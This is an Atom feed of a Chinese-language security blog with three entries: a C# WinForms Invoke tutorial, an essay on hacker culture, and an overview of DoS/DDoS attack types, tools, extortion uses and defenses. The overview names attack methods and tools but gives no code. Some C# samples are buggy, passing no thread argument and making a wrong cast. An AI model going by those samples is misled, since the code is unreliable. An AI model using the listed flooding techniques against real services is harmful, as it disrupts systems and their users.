<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ISSAC&#39;s blog</title>
  
  <subtitle>CyberSecurity blog</subtitle>
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2023-06-17T02:26:08.795Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>ISSAC</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>【Code】C# 元件Invoke的方法</title>
    <link href="http://example.com/2023/06/14/%E3%80%90Code%E3%80%91CSharpInvokeMethod/"/>
    <id>http://example.com/2023/06/14/%E3%80%90Code%E3%80%91CSharpInvokeMethod/</id>
    <published>2023-06-14T07:57:57.000Z</published>
    <updated>2023-06-17T02:26:08.795Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>記錄一下C#中可以在Thread中存取Controls的方法</p><h1 id="C-元件執行程式"><a href="#C-元件執行程式" class="headerlink" title="C# 元件執行程式"></a>C# 元件執行程式</h1><p>C# WindowsForm中我們可以把要執行的程式寫在元件的事件(Event)中，<br>例如button1按下後可以彈出MessageBox的程式為</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">private void button1_Click(object sender, EventArgs e)<br>&#123;<br>    MessageBox.Show(&quot;Hello world&quot;);<br>    //MessageBox.Show(&quot;Hello world&quot;,&quot;Here is the test&quot;, MessageBoxButtons.OK, MessageBoxIcon.Error);<br>&#125;<br></code></pre></td></tr></table></figure><p>如果我們要把Hello world顯示在TextBox1上，那程式就會是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">private void button1_Click(object sender, EventArgs e)<br>&#123;<br>    textBox1.Text = &quot;Hello world&quot;;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="需要時間的程式"><a href="#需要時間的程式" class="headerlink" title="需要時間的程式"></a>需要時間的程式</h1><p>現在考慮一個ConsoleApplication<br>要把數字 i &#x3D; 0 ~ 9999一行一行地顯示在Console上，<br>這很簡單 :</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">for (int i = 0; i &lt; 10000; i++)<br>&#123;<br>    Console.WriteLine(i);<br>&#125;<br></code></pre></td></tr></table></figure><p>可是如果在WindowsForm中要把 i &#x3D; 0 ~ 9999一行一行地顯示在textBox1上呢 ?</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">for (int i = 0 ; i &lt; 10000; i++)<br>&#123;<br>    textBox1.AppendText(i.ToString());<br>    textBox1.AppendText(Environment.NewLine);<br>&#125;<br></code></pre></td></tr></table></figure><p>然後把這程式放到Button1內 :</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">private void button1_Click(object sender, EventArgs e)<br>&#123;<br>    for (int i = 0 ; i &lt; 10000; i++)<br>    &#123;<br>        textBox1.AppendText(i.ToString());<br>        textBox1.AppendText(Environment.NewLine);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>好像很簡單對吧 ? 但事實不是這樣，當你執行後你會發現你的WindowsForm根本動不了，過了一段時間後WindowsForm可以動，然後數字 0 ~ 9999會突然出現在textBox1上，可是現在我想要的結果是數字會像在ConsoleApplication上一行一行地顯示在TextBox上，而不是這樣突然出現，何況程式還會突然卡死。</p><h1 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h1><h2 id="UI-Thread-Main-Thread"><a href="#UI-Thread-Main-Thread" class="headerlink" title="UI Thread (Main Thread)"></a>UI Thread (Main Thread)</h2><p>WindowsForm在不使用其他Thread的時候在程式打開(打開.exe檔)的一刻到程式關掉時，所有事都會發生在UI Thread上，例如for loop，Thread.Sleep()，Button按鍵等等，甚至包括WindowsForm本身的上下左右移動，也就是說當你按下button1時，程式就會進入for loop，而此時for loop就是發生在UI Thread上，直到for loop結束，UI Thread才會從for loop跑出來，可是在for loop結束之前，你的for loop都無法跑出來，也就不能對WindowsForm進行住何操作，而數字顯示在textBox1上這件事也是發生在UI Thread上，但此時UI Thread還在for loop當中，所以這就是為甚麼你的程式不能移動，也不會馬上顯示數字。</p><h1 id="解決方法"><a href="#解決方法" class="headerlink" title="解決方法"></a>解決方法</h1><h2 id="Thread"><a href="#Thread" class="headerlink" title="Thread"></a>Thread</h2><p>這邊我們會想到可以建立一個新的Thread，用這個Thread去執行for loop，具體方法如下 :   </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">void RunLoop()<br>&#123;<br>    for (int i = 0 ; i &lt; 10000; i++)<br>    &#123;<br>        textBox1.AppendText(i.ToString());<br>        textBox1.AppendText(Environment.NewLine);<br>    &#125;<br>&#125;<br><br>private void button1_Click(object sender, EventArgs e)<br>&#123;<br>    new Thread(RunLoop).Start();<br>&#125;<br></code></pre></td></tr></table></figure><p>看上去合理的程式，執行看看，又出現問題了，IDE會直接跟你說跨執行緒作業無效。</p><h2 id="原因-1"><a href="#原因-1" class="headerlink" title="原因"></a>原因</h2><p>新的Thread不能直接存取另外一個Thread，需要再加上一些東西，可以使用delegate或MethodInvoke的方法解決，這邊我提供一個我自己常用的方法，就是直接對元件Invoke</p><h2 id="對元件直接Invoke"><a href="#對元件直接Invoke" class="headerlink" title="對元件直接Invoke"></a>對元件直接Invoke</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">void RunLoop()<br>&#123;<br>    for (int i = 0 ; i &lt; 10000; i++)<br>    &#123;<br>        textBox1.Invoke(new Action(() =&gt; <br>        &#123;<br>            textBox1.AppendText(i.ToString());<br>            textBox1.AppendText(Environment.NewLine);<br>        &#125;));<br>        //或者以下寫法<br>        //textBox1.Invoke(new Action(() =&gt; textBox1.AppendText(i.ToString())));<br>        //textBox1.Invoke(new Action(() =&gt; textBox1.AppendText(Environment.NewLine)));<br>    &#125;<br>&#125;<br><br>private void button1_Click(object sender, EventArgs e)<br>&#123;<br>    new Thread(RunLoop).Start();<br>&#125;<br></code></pre></td></tr></table></figure><p>如此一來，數字就可以一行一行顯示</p><h2 id="傳參數"><a href="#傳參數" class="headerlink" title="傳參數"></a>傳參數</h2><h3 id="一個參數"><a href="#一個參數" class="headerlink" title="一個參數"></a>一個參數</h3><p>現在讓for loop的最大數字可控 :</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">void RunLoop(object o)<br>&#123;<br>    for (int i = 0 ; i &lt; (int)o; i++)<br>    &#123;<br>        textBox1.Invoke(new Action(() =&gt; <br>        &#123;<br>            textBox1.AppendText(i.ToString());<br>            textBox1.AppendText(Environment.NewLine);<br>        &#125;));<br>        //或者以下寫法<br>        //textBox1.Invoke(new Action(() =&gt; textBox1.AppendText(i.ToString())));<br>        //textBox1.Invoke(new Action(() =&gt; textBox1.AppendText(Environment.NewLine)));<br>    &#125;<br>&#125;<br><br>private void button1_Click(object sender, EventArgs e)<br>&#123;<br>    object o = 10;<br>    new Thread(RunLoop).Start();<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="多個參數"><a href="#多個參數" class="headerlink" title="多個參數"></a>多個參數</h3><p>現在讓for loop的最大數字可控且在指定TextBox顯示 :</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">void RunLoop(object o)<br>&#123;<br>    object[] obj_array = (object[])o;<br>    int max = (int)obj_array[0];<br>    TextBox textbox = (TextBox)obj_array[1];<br>    //TextBox textbox = obj_array[1] as TextBox;<br><br>    for (int i = 0 ; i &lt; (int)o; i++)<br>    &#123;<br>        textbox.Invoke(new Action(() =&gt; <br>        &#123;<br>            textbox.AppendText(i.ToString());<br>            textbox.AppendText(Environment.NewLine);<br>        &#125;));<br>        //或者以下寫法<br>        //textbox.Invoke(new Action(() =&gt; textbox.AppendText(i.ToString())));<br>        //textbox.Invoke(new Action(() =&gt; textbox.AppendText(Environment.NewLine)));<br>    &#125;<br>&#125;<br><br>private void button1_Click(object sender, EventArgs e)<br>&#123;<br>    int max = 100;<br>    new Thread(new ParameterizedThreadStart(RunLoop)).Start(new object[] <br>    &#123;<br>        max, textBox1<br>    &#125;);<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;記錄一下C#中可以在Thread中存取Controls的方法&lt;/p&gt;
&lt;h1 id=&quot;C-元件執行程式&quot;&gt;&lt;a href=&quot;#C-元件執行程</summary>
      
    
    
    
    <category term="Code" scheme="http://example.com/categories/Code/"/>
    
    
    <category term="Code" scheme="http://example.com/tags/Code/"/>
    
    <category term="C#" scheme="http://example.com/tags/C/"/>
    
    <category term="Program" scheme="http://example.com/tags/Program/"/>
    
  </entry>
  
  <entry>
    <title>【Nonsense】資安圈 = 娛樂圈 ? 對資安圈現在的想法</title>
    <link href="http://example.com/2023/06/12/%E3%80%90Nonsense%E3%80%91hack-entertain/"/>
    <id>http://example.com/2023/06/12/%E3%80%90Nonsense%E3%80%91hack-entertain/</id>
    <published>2023-06-12T08:06:38.000Z</published>
    <updated>2023-06-13T12:18:19.238Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>一直以來黑&#x2F;駭客(本文用黑客一詞)給人的感覺都是很神秘和很帥，<br>在很多電影中黑客給一種就是救埸王的感覺，小事就是入侵手機，大事就是入侵衛星。<br>但真的是這樣嗎 ?<br>我在資安這圈子時間也不算短了，打算分享一下我的想法。</p><hr><h1 id="技術的發展"><a href="#技術的發展" class="headerlink" title="技術的發展"></a>技術的發展</h1><p>從古到今一直都有出現很多很令人興奮的新技術，這些技術不管是在文化還是科技上都把文明的時鐘推前了一大步，這些技術發展到今都有有些共同的特徵，會出現現狂熱朝，大家都在討論這種技術，當技術慢慢地成熟時，技術的細節已經不是大眾能理解的了，而是由幾個這方面領域的專家開拓的。<br>那技術成熟之後呢 ? 當大家都可以接觸到這種技術的表面時，就會出現很奇怪的現像，大家都想分高下，看看誰能了解得更多，每當有人對這件事進行提問題，大家都會爭先恐後地發表自己所知道的。</p><hr><h1 id="對黑客的印象"><a href="#對黑客的印象" class="headerlink" title="對黑客的印象"></a>對黑客的印象</h1><h2 id="現實大眾對黑客的印象"><a href="#現實大眾對黑客的印象" class="headerlink" title="現實大眾對黑客的印象"></a>現實大眾對黑客的印象</h2><p>大眾對黑客的印象大概就是「天才」之類的。</p><h2 id="動漫中的黑客"><a href="#動漫中的黑客" class="headerlink" title="動漫中的黑客"></a>動漫中的黑客</h2><p class='item-img' data-src='/pic/hackentainmentquestionmark/2.png'><img src="/pic/hackentainmentquestionmark/2.png"><br class='item-img' data-src='/pic/hackentainmentquestionmark/3.png'><img src="/pic/hackentainmentquestionmark/3.png"><br>全是美少女，帥哥</p><h2 id="電影中的黑客"><a href="#電影中的黑客" class="headerlink" title="電影中的黑客"></a>電影中的黑客</h2><p class='item-img' data-src='/pic/hackentainmentquestionmark/9.png'><img src="/pic/hackentainmentquestionmark/9.png"><br class='item-img' data-src='/pic/hackentainmentquestionmark/10.png'><img src="/pic/hackentainmentquestionmark/10.png"><br>全是帥哥美女，</p><h2 id="現實中的黑帽黑客"><a href="#現實中的黑帽黑客" class="headerlink" title="現實中的黑帽黑客"></a>現實中的黑帽黑客</h2><p class='item-img' data-src='/pic/hackentainmentquestionmark/7.png'><img src="/pic/hackentainmentquestionmark/7.png"><br>做不好就等死吧。</p><hr><h1 id="媒體的渲染"><a href="#媒體的渲染" class="headerlink" title="媒體的渲染"></a>媒體的渲染</h1><p class='item-img' data-src='/pic/hackentainmentquestionmark/4.png'><img src="/pic/hackentainmentquestionmark/4.png"><br class='item-img' data-src='/pic/hackentainmentquestionmark/5.png'><img src="/pic/hackentainmentquestionmark/5.png"><br class='item-img' data-src='/pic/hackentainmentquestionmark/6.png'><img src="/pic/hackentainmentquestionmark/6.png"><br>媒體很喜歡把少年黑客叫做「天才」「最強」</p><h1 id="資安VS畫畫"><a href="#資安VS畫畫" class="headerlink" title="資安VS畫畫"></a>資安VS畫畫</h1><p>在美術領域中從來不乏年輕而且畫畫很漂亮的人，<br>在資安領域也是一樣，但是可以被同行稱為高手或大師的人又有多少個 ?<br>我以前也有做過類似的事，可是後來我覺得這是很愚蠢的行為。</p><hr><h1 id="黑客甚麼都能黑"><a href="#黑客甚麼都能黑" class="headerlink" title="黑客甚麼都能黑?"></a>黑客甚麼都能黑?</h1><p>這是很大的誤會，以iphone為例子，雖然一直有一個說法是iphone有國家的後門存在，<br>但要破解Iphone這種手機對大部分黑客(白帽+黑帽)都絕對不是甚麼容易的事，<br>本文中第一部份說到入侵手機是一事「小事」，如果你指的入侵是任何一個人的手機只要有打開就能入侵的話，那這絕對不是甚麼小事。<br>有很多人一聽到黑客這兩個事就會問他「你能幫我破解FB嗎 ?」<br>大概在大眾的眼中破解一個帳號是一件很容易的事。<br>漏洞找不到就是找不到，就像100%的HTML網頁，只有hello world的程式<br>你要資安人士在這找出漏洞，他大概只會想打你。</p><hr><h1 id="找漏洞是很有趣的事"><a href="#找漏洞是很有趣的事" class="headerlink" title="找漏洞是很有趣的事 ?"></a>找漏洞是很有趣的事 ?</h1><p>能找到漏洞然後寫出Exploit或者POC當然有趣，那要是找不到呢 ?<br>相信有滲透相關經驗的人都體驗過那種坐在電腦前甚麼都找不到的感想，<br>然後還是寫一個簡單的reflect xss在報告上。</p><hr><h1 id="實力上的比較"><a href="#實力上的比較" class="headerlink" title="實力上的比較"></a>實力上的比較</h1><h2 id="比較的意義"><a href="#比較的意義" class="headerlink" title="比較的意義"></a>比較的意義</h2><p>全心全意討論技術的人可以說是越來越少了，很多人學了資安相關的技術就要馬上告訴全世界自己是黑客，能得到身邊同年齡人的認可的確很重要，但絕對不是用這種方法。</p><h2 id="領域的比較"><a href="#領域的比較" class="headerlink" title="領域的比較"></a>領域的比較</h2><p>一直有人覺得黑客有所謂的最強，首先資訊安全是一個很大的領域，密碼破解、滲透測試、緩衝區溢位、物聯網安全、大規模監控、大規模掃瞄、數據修改、黑帽SEO等等…<br>不同領域的實力強弱比較是沒有太大意義的，就好像要在跑步和跳高兩個領域進行比較並不合理一樣。<br>如果要比較，那就應該是對社會XXX或者年薪等等有共通點的比較。</p><h2 id="Bug-Bounty計劃"><a href="#Bug-Bounty計劃" class="headerlink" title="Bug Bounty計劃"></a>Bug Bounty計劃</h2><p>Bug Bounty的確是一個能看排名的計劃，2016年大陸的烏雲網還沒關閉時就有一個長期在榜一的大哥，叫做豬豬俠(曾發現阿里巴巴，百度等等存在高危漏洞)，Bug Bounty的漏洞是會以分數進行計算的，如此一看那的確是可以在滲透方面分出高下。</p><h2 id="工具編寫"><a href="#工具編寫" class="headerlink" title="工具編寫"></a>工具編寫</h2><p>寫工具也是一個很多比較的方法，總會有人因為寫出很有名和很好用的工具而成名</p><h1 id="黑客與英雄主義"><a href="#黑客與英雄主義" class="headerlink" title="黑客與英雄主義"></a>黑客與英雄主義</h1><p>資安領域也有著英雄主義，會有黑客因為做出某件事而被大眾稱為英雄，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">OpenBSD crowd is a bunch of masturbating monkeys — Linus<br></code></pre></td></tr></table></figure><p>這句話是Linux之父Linus罵OpenBSD的話，因為Linus認為軟體的bug比安全漏洞還要多，而資安人士因為找到漏洞成為英雄但忽略了一般bug的問題。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;一直以來黑&amp;#x2F;駭客(本文用黑客一詞)給人的感覺都是很神秘和很帥，&lt;br&gt;在很多電影中黑客給一種就是救埸王的感覺，小事就是入侵手機，大</summary>
      
    
    
    
    <category term="Nonsense" scheme="http://example.com/categories/Nonsense/"/>
    
    
    <category term="nonsense" scheme="http://example.com/tags/nonsense/"/>
    
    <category term="thinking" scheme="http://example.com/tags/thinking/"/>
    
    <category term="hacker" scheme="http://example.com/tags/hacker/"/>
    
  </entry>
  
  <entry>
    <title>【BlackHat】DoS，DDoS與BotNet</title>
    <link href="http://example.com/2023/06/12/%E3%80%90BlackHat%E3%80%91DoSandDDoS/"/>
    <id>http://example.com/2023/06/12/%E3%80%90BlackHat%E3%80%91DoSandDDoS/</id>
    <published>2023-06-12T08:05:35.000Z</published>
    <updated>2023-06-13T05:39:46.598Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>DoS&#x2F;DDoS應該是小學生最喜歡的東西了，很多小學生和小屁孩都喜歡把說ddos然後就會覺得自己是黑客&#x2F;駭客。<br>(PS: 作者習慣使用黑客一詞，本文也會使用該詞)<br>在2015-2016年左右時，台灣當時有很多人喜歡使用LOIC這種工具，然後就說自己是黑客。<br>事實上他們那跟本就不是甚麼DDoS，只是DoS罷了，也許是說成DDoS聽上去會比較強吧。<br>作者曾經也是那樣的人，所以我很討厭以前的自己(現在其實也差不多啦…)。<br>DoS絕對不是甚麼好玩的東西，<br>它的確是一種黑客會用的手段，但它也許是門檻最低的，<br>然而正是因為門檻低，所以很多人都不願深入了解。<br>DoS&#x2F;DDoS需然看似很簡單，但是有很大的戰略價值，<br>本文作者就打算記錄一下自己知道的，如果有一天我忘了也可以回來看，<br>也算是給讀者們的科普。</p><h1 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h1><p>為甚麼要攻撃 ?<br>是誰在攻撃 ?<br>相信這都是每個網頁admin都會想過的問題，<br>說出這方面的技術不是想讓你們去攻撃其他人，<br>而是想讓你們知道相關原理，再進行防範。</p><h1 id="Disclaimer"><a href="#Disclaimer" class="headerlink" title="Disclaimer"></a>Disclaimer</h1><p>本文只限用於學習用途</p><h1 id="DoS"><a href="#DoS" class="headerlink" title="DoS"></a>DoS</h1><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>DoS全稱是 Denial of Server，技術上指的是發一大堆封包或Request到目標電腦上，<br>讓目標因為過大的負荷而停止服務。<br>DDoS多了一個 D (Distributed)<br>所以本文會把 DDoS&#x2F;DoS的大部份技術都放在DoS上,<br>而DDoS就會和BotNet一起討論</p><h2 id="舊時代的DoS"><a href="#舊時代的DoS" class="headerlink" title="舊時代的DoS"></a>舊時代的DoS</h2><h3 id="Ping-of-Death"><a href="#Ping-of-Death" class="headerlink" title="Ping of Death"></a>Ping of Death</h3><p>以前的電腦無法處理大於IPv4最大的封包大小(65535 bytes)的ping封包，<br>在目標接收到該封包後電腦會Crash掉</p><h3 id="TearDrop"><a href="#TearDrop" class="headerlink" title="TearDrop"></a>TearDrop</h3><p>發送損壞的封包，癱瘓系統。</p><p>以上兩種在現代基本已經過時，以下是目前主流的攻撃方式</p><h1 id="現代常用的DoS技巧"><a href="#現代常用的DoS技巧" class="headerlink" title="現代常用的DoS技巧"></a>現代常用的DoS技巧</h1><h2 id="攻撃BandWidth"><a href="#攻撃BandWidth" class="headerlink" title="攻撃BandWidth"></a>攻撃BandWidth</h2><ol><li>ICMP&#x2F;IGMP   </li><li>UDP Flood</li></ol><h2 id="反射-放大攻撃"><a href="#反射-放大攻撃" class="headerlink" title="反射+放大攻撃"></a>反射+放大攻撃</h2><h3 id="Introduction-1"><a href="#Introduction-1" class="headerlink" title="Introduction"></a>Introduction</h3><p>英文是DRDoS(Distributed Reflection Denial of Service),<br>某些網路服務對於Request和Response之間長度大小的不一致，<br>如果這時source IP可被偽造，那這個很大的Response就會直接發到受害者的電腦上，還可以隱藏攻撃者的IP。</p><h3 id="Method"><a href="#Method" class="headerlink" title="Method"></a>Method</h3><ol><li>ACK Reflect</li><li>DNS Reflect</li><li>NTP Reflect</li><li>SNMP</li></ol><h2 id="系統資源消耗"><a href="#系統資源消耗" class="headerlink" title="系統資源消耗"></a>系統資源消耗</h2><h3 id="Method-1"><a href="#Method-1" class="headerlink" title="Method"></a>Method</h3><ol><li>TCP Flood</li><li>SYN Flood</li><li>PSH + ACK</li><li>RST Flood</li><li>Sockstress</li></ol><h3 id="誤區"><a href="#誤區" class="headerlink" title="誤區"></a>誤區</h3><p>DDoS&#x2F;DoS不全是Flood，的確目前大部份都是Flood，但也有所謂的 Low and Slow Attack  </p><h2 id="SSL攻撃"><a href="#SSL攻撃" class="headerlink" title="SSL攻撃"></a>SSL攻撃</h2><h3 id="Introduction-2"><a href="#Introduction-2" class="headerlink" title="Introduction"></a>Introduction</h3><p>SSL : Secure Sockets Layer  </p><h3 id="Method-2"><a href="#Method-2" class="headerlink" title="Method"></a>Method</h3><ol><li>THC SSL DoS</li><li>SSL Flood</li></ol><h2 id="攻撃應用資源"><a href="#攻撃應用資源" class="headerlink" title="攻撃應用資源"></a>攻撃應用資源</h2><h3 id="Method-3"><a href="#Method-3" class="headerlink" title="Method"></a>Method</h3><ol><li>DNS Query Flood</li><li>DNS NXDomain</li></ol><h2 id="Web攻撃"><a href="#Web攻撃" class="headerlink" title="Web攻撃"></a>Web攻撃</h2><h3 id="Method-4"><a href="#Method-4" class="headerlink" title="Method"></a>Method</h3><ol><li>HTTP Flood</li><li>Slowloris</li><li>POST</li><li>ReDoS</li></ol><h2 id="漏洞型DoS"><a href="#漏洞型DoS" class="headerlink" title="漏洞型DoS"></a>漏洞型DoS</h2><p>找出網頁漏洞，該漏洞可把網頁直接卡死。</p><h2 id="Minecraft中的DoS"><a href="#Minecraft中的DoS" class="headerlink" title="Minecraft中的DoS"></a>Minecraft中的DoS</h2><h3 id="普通DoS"><a href="#普通DoS" class="headerlink" title="普通DoS"></a>普通DoS</h3><p>如上</p><h3 id="BOT"><a href="#BOT" class="headerlink" title="BOT"></a>BOT</h3><p>發出特別的JSON封包到伺服器，該JSON封包在伺服器內構成虛擬玩家，<br>達到伺服器最大人數時就會阻止其他正常玩定進入。<br>同時虛擬玩家也可以進行無意義的洗版，進一步加重伺服器的負擔。</p><h1 id="現代DoS常用的工具"><a href="#現代DoS常用的工具" class="headerlink" title="現代DoS常用的工具"></a>現代DoS常用的工具</h1><h2 id="綜合工具"><a href="#綜合工具" class="headerlink" title="綜合工具"></a>綜合工具</h2><ul><li>Hping</li><li>PenTBox</li><li>Zarp</li></ul><h2 id="壓力測試"><a href="#壓力測試" class="headerlink" title="壓力測試"></a>壓力測試</h2><p>壓力測試(StressTest)即合法的用DoS攻撃網站</p><ul><li>LOIC</li><li>HOIC</li><li>HULK</li></ul><h2 id="Pro"><a href="#Pro" class="headerlink" title="Pro"></a>Pro</h2><ul><li>Slowloris</li><li>RUDY</li><li>THC SSL DOS</li></ul><h1 id="DDoS-amp-BotNet"><a href="#DDoS-amp-BotNet" class="headerlink" title="DDoS &amp; BotNet"></a>DDoS &amp; BotNet</h1><h2 id="Introduction-3"><a href="#Introduction-3" class="headerlink" title="Introduction"></a>Introduction</h2><p>DDoS就是比DoS多了一個D(Distributed)</p><h2 id="Theory"><a href="#Theory" class="headerlink" title="Theory"></a>Theory</h2><h3 id="BotNet技術"><a href="#BotNet技術" class="headerlink" title="BotNet技術"></a>BotNet技術</h3><p>目前BotNet的主要技術有四個</p><ul><li>IRC</li><li>TCP Server &amp; Client</li><li>HTTP</li><li>P2P</li></ul><h3 id="自願型BotNet"><a href="#自願型BotNet" class="headerlink" title="自願型BotNet"></a>自願型BotNet</h3><p>BotNet可以用漏洞來「抓雞」，在受害者非自願的情況下進行攻撃，<br>而自願型BotNet就是每個人都對目標發動DoS攻撃，<br>很有名的Anonymous在過去就是這樣做的，每個成員都使用LOIC去攻撃。</p><h2 id="DDoS的戰術價值"><a href="#DDoS的戰術價值" class="headerlink" title="DDoS的戰術價值"></a>DDoS的戰術價值</h2><p>1.<br>2. 用DDoS吸引人的注意，等企業內部人力資源集中在處理DDoS時，很有可能會被其他攻撃者以入侵的方式攻撃伺服器。歷史上真有其事，具體可參考「</p><h2 id="DDoS在黑色產業上的應用"><a href="#DDoS在黑色產業上的應用" class="headerlink" title="DDoS在黑色產業上的應用"></a>DDoS在黑色產業上的應用</h2><p>DDoS不止可以用來搞事情，還可以轉化為錢 :  </p><ol><li>競爭<br>為了打撃對手而進行DDoS</li><li>勒索<br>中小型公句和企業一般不具備防DDoS的技術，而專業的防DDoS又需要錢。攻撃者往往會把價錢定在一個「合適」的數字，讓受害者就範。</li><li>報復<br>攻撃者們會利用個人要報復而去攻撃的情緒，提出DDoS的服務</li></ol><h1 id="DDoS的防範"><a href="#DDoS的防範" class="headerlink" title="DDoS的防範"></a>DDoS的防範</h1><h2 id="Introduction-4"><a href="#Introduction-4" class="headerlink" title="Introduction"></a>Introduction</h2><p>目前沒有一個完美的技術可以防DDoS，因為DDoS本來就是因為網路設計上的問題所導致的，但是有緩解和治理的方法。</p><h2 id="BotNet的打撃"><a href="#BotNet的打撃" class="headerlink" title="BotNet的打撃"></a>BotNet的打撃</h2><p>對BotNet的處理在現實中是很困難的事，因為數量太多而且分散在不同地方。但目前也有幾種可行的方法 :   </p><h3 id="針對BotNet本身"><a href="#針對BotNet本身" class="headerlink" title="針對BotNet本身"></a>針對BotNet本身</h3><ol><li>Reverse Engineering : 取得樣本後把病毒特徵加到防毒軟體上，直接對成千上萬用戶檢查。</li><li>接管或者摧毀BotNet : 很難的做法，一般需要政府間的合作，只有實力強大的跨國公司才可以做到，歷史上成功的例子就是Microsoft對Nitol的摧毀。</li></ol><h2 id="直接封IP"><a href="#直接封IP" class="headerlink" title="直接封IP"></a>直接封IP</h2><p>在以前中國GWF曾經因為技術上的問題而對國外做出疑似DDoS的行為，當時有幾個國家馬上封鎖中國的IP，當然了這招在現實中的中小企業不現實，除非攻撃者是使用DoS。</p><h2 id="針對Fake-IP"><a href="#針對Fake-IP" class="headerlink" title="針對Fake IP"></a>針對Fake IP</h2><p>可以參考 CERT和IETF的方法</p><ol><li>CERT Advisory CA-1996-21</li><li>RFC 2827</li><li>Unicast Reverse Path Forwarding</li></ol><h2 id="流量的稀釋"><a href="#流量的稀釋" class="headerlink" title="流量的稀釋"></a>流量的稀釋</h2><ul><li>CDN</li><li>Anycast</li></ul><h2 id="誤區-1"><a href="#誤區-1" class="headerlink" title="誤區"></a>誤區</h2><ol><li>防火牆可以防DDoS ?<br>這是很大的誤會，強悍的DDoS反而會影響防火牆的運作效率。</li><li>買更好的BandWidth<br>好的BandWidth要更多的錢，而DDoS流量是用GB計算了，沒有太大的用處。</li></ol>]]></content>
    
    
      
      
